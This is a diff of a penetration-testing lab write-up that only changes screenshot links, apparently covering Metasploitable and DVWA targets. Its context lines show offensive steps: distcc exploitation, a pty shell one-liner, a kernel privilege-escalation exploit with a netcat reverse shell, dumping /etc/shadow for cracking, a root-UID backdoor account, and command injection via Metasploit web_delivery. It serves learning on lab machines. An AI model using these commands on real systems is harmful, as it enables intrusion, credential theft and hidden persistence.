@@ -87,9 +87,9 @@ To begin, I usually start with a basic script scan using Nmap.  The output file 
 
 ​	On examination of the Metasploit module [source code](https://github.com/rapid7/metasploit-framework/blob/master//modules/exploits/unix/misc/distcc_exec.rb), I will use Armitage to simplify the process instead of developing a new exploit. 
 
-![login](https://git.rjphillips.online/main/networkattacksproject/-/raw/main/target/screens/armsetup.PNG)
+![login](https://github.com/jjay1288/netattacksproj/tree/main/target/screens/armsetup.PNG)
 
-![login](https://git.rjphillips.online/main/networkattacksproject/-/raw/main/target/screens/shell.PNG)
+![login](https://github.com/jjay1288/netattacksproj/tree/main/target/screens/shell.PNG)
 
 ​	We now have a basic shell under the user "daemon".  Next we will stabilize our shell (make it a full fledged TTY interface).  With a guess that python was installed, I stabilized with a one-liner of code
 
@@ -97,7 +97,7 @@ To begin, I usually start with a basic script scan using Nmap.  The output file 
 python -c ‘import pty; pty.spawn(“/bin/sh”)’
 ```
 
-![login](https://git.rjphillips.online/main/networkattacksproject/-/raw/main/target/screens/stable.PNG)
+![login](https://github.com/jjay1288/netattacksproj/tree/main/target/screens/stable.PNG)
 
 ​	The next step is to escalate our privileges to root.  
 
@@ -110,7 +110,7 @@ uname -a
 lsb_release -a
 ```
 
-![login](https://git.rjphillips.online/main/networkattacksproject/-/raw/main/target/screens/uname.PNG)
+![login](https://github.com/jjay1288/netattacksproj/tree/main/target/screens/uname.PNG)
 
 ​	After using searchsploit to research, I decided on a privilege escalation method found [here](https://www.exploit-db.com/exploits/8572).  First, we download the exploit source code and save it as "8572.c".  Then we create a new file, "run
 ", and insert and save the following code:
@@ -142,7 +142,7 @@ gcc -o exploit 8572.c
 cat /proc/net/netlink
 ```
 
-![enumsetup](https://git.rjphillips.online/main/networkattacksproject/-/raw/main/target/screens/pid.PNG)
+![enumsetup](https://github.com/jjay1288/netattacksproj/tree/main/target/screens/pid.PNG)
 
 ​	The only non-zero process ID is what we are looking for.  Then we start a netcat listenener on another terminal with:
 
@@ -156,15 +156,15 @@ Now we are ready.  We pass the PID into the exploit and run it with:
 ./exploit 2761
 ```
 
-![enumsetup](https://git.rjphillips.online/main/networkattacksproject/-/raw/main/target/screens/reverseroot.PNG)
+![enumsetup](https://github.com/jjay1288/netattacksproj/tree/main/target/screens/reverseroot.PNG)
 
 ​	Success!  Now we stabilize it once more.
 
-![enumsetup](https://git.rjphillips.online/main/networkattacksproject/-/raw/main/target/screens/stabileroot.PNG)
+![enumsetup](https://github.com/jjay1288/netattacksproj/tree/main/target/screens/stabileroot.PNG)
 
 ​	Next, we dump the /etc/shadow file to a text file, and pass that file into John the Ripper.
 
-![enumsetup](https://git.rjphillips.online/main/networkattacksproject/-/raw/main/target/screens/creds.PNG)
+![enumsetup](https://github.com/jjay1288/netattacksproj/tree/main/target/screens/creds.PNG)
 
 Success!  We have admin credentials!
 
@@ -172,7 +172,7 @@ Success!  We have admin credentials!
 
 ​	Now we can simply ssh into the system and see what else we can explore.
 
-![enumsetup](https://git.rjphillips.online/main/networkattacksproject/-/raw/main/target/screens/ssh.PNG)
+![enumsetup](https://github.com/jjay1288/netattacksproj/tree/main/target/screens/ssh.PNG)
 
 ##### D) Persistence
 
@@ -213,7 +213,7 @@ useradd -u0 -g0 -o -s /bin/bash -p `pwnd' pwnd
 
 ​	We find only two ports, SSH on 22 and http on 80.  Obviously this is a web server, and must enumerate on the machine through other means.  Navigating to http:\\\192.168.1.210 in the browser presents us with a login screen:
 
-​											![login](https://git.rjphillips.online/main/networkattacksproject/-/raw/main/target2/screens/login.PNG) 
+​											![login](https://github.com/jjay1288/netattacksproj/tree/main/target2/screens/login.PNG) 
 
 ​	The next step is to find out if there are any interesting directories on this web app.  We will start a  [DirBuster](https://www.kali.org/tools/dirbuster/) loaded with the directory-list-medium that comes in kali and scan. The results of this scan can be found [here](https://git.rjphillips.online/main/networkattacksproject/-/blob/main/target2/scans/DirBusterReport-192.168.1.210-80.txt).  Dirbuster does this by tracking responses from the web server.  A "Not Found" reply means nothing exists there, while "Permission Denied" will indicate that the directory exists.
 
@@ -233,13 +233,13 @@ useradd -u0 -g0 -o -s /bin/bash -p `pwnd' pwnd
 
 Using Burp Suite to proxy the http requests, you can see that the initial connection will also return a response from the server setting up a cookie:
 
-![cookie](https://git.rjphillips.online/main/networkattacksproject/-/raw/main/target2/screens/setcookie.PNG)
+![cookie](https://github.com/jjay1288/netattacksproj/tree/main/target2/screens/setcookie.PNG)
 
 ​	My initial instinct is that the basic security feature at play here is a server-side check to compare the PHPSESSID to the user_token.  Using Burp to intercept the traffic, we confirm this is the case.
 
-![post](https://git.rjphillips.online/main/networkattacksproject/-/raw/main/target2/screens/post.PNG)
+![post](https://github.com/jjay1288/netattacksproj/tree/main/target2/screens/post.PNG)
 
-![postresult](https://git.rjphillips.online/main/networkattacksproject/-/raw/main/target2/screens/postresult.PNG)
+![postresult](https://github.com/jjay1288/netattacksproj/tree/main/target2/screens/postresult.PNG)
 
 **We also see that the site sends login information over http in plain text!**
 
@@ -303,7 +303,7 @@ chmod +x loginexploit.sh
 ./loginexploit.sh
 ```
 
-![postresult](https://git.rjphillips.online/main/networkattacksproject/-/raw/main/target2/screens/logincreds.PNG)
+![postresult](https://github.com/jjay1288/netattacksproj/tree/main/target2/screens/logincreds.PNG)
 
 And we have our login credentials!
 
@@ -313,11 +313,11 @@ And we have our login credentials!
 
 ​	We go to the page in Firefox and enter our credentials, and are presented with index.php.
 
-![postresult](https://git.rjphillips.online/main/networkattacksproject/-/raw/main/target2/screens/index.PNG)
+![postresult](https://github.com/jjay1288/netattacksproj/tree/main/target2/screens/index.PNG)
 
 I guess this Brute Force section would have been much easier to exploit.
 
-![postresult](https://git.rjphillips.online/main/networkattacksproject/-/raw/main/target2/screens/easy.PNG)
+![postresult](https://github.com/jjay1288/netattacksproj/tree/main/target2/screens/easy.PNG)
 
 
 
@@ -325,27 +325,27 @@ I guess this Brute Force section would have been much easier to exploit.
 
 ​	After testing the form, we find that you can enter an IP address and then follow it with a semicolon to execute shell commands on the target. We will start up Metasploit and set up our attack. We will get setup to use the [web_delivery](https://www.offensive-security.com/metasploit-unleashed/web-delivery/) module withing msf
 
-![msf](https://git.rjphillips.online/main/networkattacksproject/-/raw/main/target2/screens/msfsetup.PNG)
+![msf](https://github.com/jjay1288/netattacksproj/tree/main/target2/screens/msfsetup.PNG)
 
 Then we copy the command at the bottom and submit to get our reverse shell!
 
-![shell](https://git.rjphillips.online/main/networkattacksproject/-/raw/main/target2/screens/shell.PNG)
+![shell](https://github.com/jjay1288/netattacksproj/tree/main/target2/screens/shell.PNG)
 
-![shell](https://git.rjphillips.online/main/networkattacksproject/-/raw/main/target2/screens/meterp.PNG)
+![shell](https://github.com/jjay1288/netattacksproj/tree/main/target2/screens/meterp.PNG)
 
 ##### D. Enumeration
 
 ​	Because this web app is installed on a fully up to date LAMP stack, further exploitation is unlikely.  The apache configs that come standard will still only allow a user to operate within the set confines of the web user (which is very restrictive).  Any further exploitation of this target would probably constitute 0-Day status for the Ubuntu OS itself.  Using Metasploit's exploit suggester we can confirm this.
 
-![msf](https://git.rjphillips.online/main/networkattacksproject/-/raw/main/target2/screens/suggest.PNG)
+![msf](https://github.com/jjay1288/netattacksproj/tree/main/target2/screens/suggest.PNG)
 
 ​	We can do some other basic enumeration, and we do find an interesting entry in the user list; "dvwa".  This user has the UID of 1000, so we can infer that it is the first non-root user created on the system.  Best practices on installing linux are to leave the root account disabled, and give another user the superuser privileges (this happens by default on Ubuntu).
 
-![msf](https://git.rjphillips.online/main/networkattacksproject/-/raw/main/target2/screens/uid.PNG)
+![msf](https://github.com/jjay1288/netattacksproj/tree/main/target2/screens/uid.PNG)
 
 ​	By manually attempting to ssh into the box as this user using some common weak passwords, we are rewarded with a new account!
 
-![msf](https://git.rjphillips.online/main/networkattacksproject/-/raw/main/target2/screens/root1.PNG)
+![msf](https://github.com/jjay1288/netattacksproj/tree/main/target2/screens/root1.PNG)
 
 #### dvwa:dvwa
 
